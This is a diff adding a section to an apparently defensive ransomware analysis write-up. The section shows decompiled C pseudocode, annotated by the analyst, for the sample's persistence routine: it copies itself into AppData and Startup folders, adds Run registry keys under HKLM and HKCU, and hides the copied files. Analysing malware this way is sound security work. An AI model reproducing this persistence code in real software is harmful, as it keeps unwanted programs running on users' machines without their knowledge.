@@ -205,3 +205,90 @@ BOOL sub_87489E()
   return v5;
 }
 ```
+- The Ransomware also attempt to achieve persistence via Registry Editing
+```C
+HKEY sub_871236()
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
+
+  phkResult = 0;
+  lpSubKey = (LPCWSTR)call_to_AES_decrypt(0x11, 0);// Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  v8 = sub_873BB3(0x10);                        // Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders and %localappdata%
+  v7 = sub_873BB3(0x12);                        // <<Startup>>;<<Common Startup>>
+  v13 = sub_873BB3(0x43);                       // backm
+  v12 = call_to_heapalloc(0x20Au);
+  lpExistingFileName = (LPCWSTR)call_to_heapalloc(0x20Au);
+  v17 = (LPCWSTR)call_to_heapalloc(0x20Au);
+  v0 = (BYTE *)call_to_heapalloc(0x20Au);
+  lpValueName = (LPCWSTR)call_to_heapalloc(0x20Au);
+  v15 = call_to_heapalloc(0x20Au);
+  lpMem = 0;
+  if ( v0
+    && lpExistingFileName
+    && sub_875B0E((LPWSTR)lpExistingFileName)   // GetModulePathW
+    && v17
+    && v12
+    && sub_875B20((int)v12)
+    && sub_8759F1((int)v17, 0x104u, 3)
+    && lpValueName
+    && sub_875B7C(lpValueName, 0)
+    && v15
+    && sub_875B7C(v15, 1)
+    && sub_8759F1((int)v0, 0x104u, 3) )
+  {
+    if ( CopyFileW(lpExistingFileName, (LPCWSTR)v0, 0) )// copy to C:\\Users\\<Username>\\AppData\\Local\\<sample's name>
+    {
+      v10 = sub_8790C6(v0);                     // Software\\Microsoft\\Windows\\CurrentVersion\\Run to malware
+      v10 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20106u, &phkResult) ? 0 : sub_873A93(lpValueName, v0);
+      sub_8790C6(v0);
+      v1 = RegOpenKeyExW(HKEY_CURRENT_USER, lpSubKey, 0, 0x20106u, &v11) ? 0 : sub_873A93(lpValueName, v0);
+      phkResult = (HKEY)(v10 > 0 || v1 > 0);
+      if ( sub_8759F1((int)v0, 0x104u, 3) )
+      {
+        CopyFileW(v17, (LPCWSTR)v0, 1);
+        FileAttributesW = GetFileAttributesW((LPCWSTR)v0);
+        if ( FileAttributesW != 0xFFFFFFFF )
+          SetFileAttributesW((LPCWSTR)v0, FileAttributesW | 2);
+      }
+    }
+    if ( v7 )
+    {
+      sub_8735D2((__int16 *)v7, &lpMem);
+      if ( lpMem )
+      {
+        v11 = 0;
+        for ( i = sub_8735A4(0); ; i = sub_8735A4(v11) )
+        {
+          v10 = i;
+          if ( !i )
+            break;
+          if ( sub_8759F1((int)v0, 0x104u, 3) ) // c:\\programdata\\microsoft\\windows\\start menu\\programs\\startup
+          {
+            CopyFileW(lpExistingFileName, (LPCWSTR)v0, 1);
+            if ( sub_8759F1((int)v0, 0x104u, 3) )
+            {
+              CopyFileW(v17, (LPCWSTR)v0, 1);
+              v4 = GetFileAttributesW((LPCWSTR)v0);
+              if ( v4 != 0xFFFFFFFF )
+                SetFileAttributesW((LPCWSTR)v0, v4 | 2);
+            }
+          }
+          v11 = (HKEY)((char *)v11 + 1);
+        }
+        heapfree(lpMem);
+      }
+    }
+  }
+  clear_heap((char *)v13);
+  clear_heap((char *)v12);
+  clear_heap((char *)lpExistingFileName);
+  clear_heap((char *)v17);
+  clear_heap((char *)v0);
+  clear_heap((char *)lpValueName);
+  clear_heap((char *)v15);
+  clear_heap((char *)lpSubKey);
+  clear_heap((char *)v8);
+  clear_heap((char *)v7);
+  return phkResult;
+}
+```
